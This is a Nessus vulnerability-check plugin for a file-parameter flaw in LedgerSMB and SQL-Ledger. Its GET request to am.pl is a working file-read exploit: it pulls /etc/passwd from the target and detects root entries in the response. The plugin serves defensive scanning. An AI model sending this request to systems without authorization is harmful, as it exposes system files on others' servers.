#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(24783);
  script_version("1.15");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(22769);

  script_name(english:"LedgerSMB / SQL-Ledger file Parameter Multiple Vulnerabilities");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl application that is affected by
multiple issues.");
  script_set_attribute(attribute:"description", value:
"The remote host is running LedgerSMB or SQL-Ledger, a web-based
double-entry accounting system. 

The version of LedgerSMB or SQL-Ledger on the remote host fails to
properly sanitize the 'file' parameter of the 'am.pl' script before
using it in various template routines in the 'AM.pm' module.  An
unauthenticated attacker can leverage this issue to display the
contents of arbitrary files or write user-supplied data to arbitrary
files on the remote host subject to the privileges of the web server
user id.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/461630/30/0/threaded");
  script_set_attribute(attribute:"solution", value:
"If using LedgerSMB, upgrade to 1.1.5 or later.  At this time, there is
no known solution for SQL-Ledger.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:TF/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/03/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ledgersmb:ledgersmb");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/ledger", "/sql-ledger", "/ledger-smb", "/ledgersmb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/etc/passwd";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/am.pl?",
      "path=bin/mozilla&",
      "action=display_form&",
      # nb: "users" gets removed and lets us avoid directory traversal sequences.
      "file=users", file, "&",
      "login=root+login"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # it looks like LedgerSMB / SQL-Ledger and...
    ("LedgerSMB " >< res || "SQL-Ledger " >< res) &&
    # there's an entry for root
    egrep(pattern:"root:.*:0:[01]:", string:res)
  )
  {
    contents = strstr(res, "<pre>");
    if (contents) contents = contents - "<pre>";
    if (contents) contents = contents - strstr(contents, "</pre>");
    if (!egrep(pattern:"root:.*:0:[01]:", string:contents)) contents = res;
    contents = data_protection::redact_etc_passwd(output:contents);
    report = string(
      "\n",
      "Here are the contents of the file '/etc/passwd' that Nessus was\n",
      "able to read from the remote host :\n",
      "\n",
      contents
    );

    security_hole(port:port, extra:report);
    exit(0);
  }
}
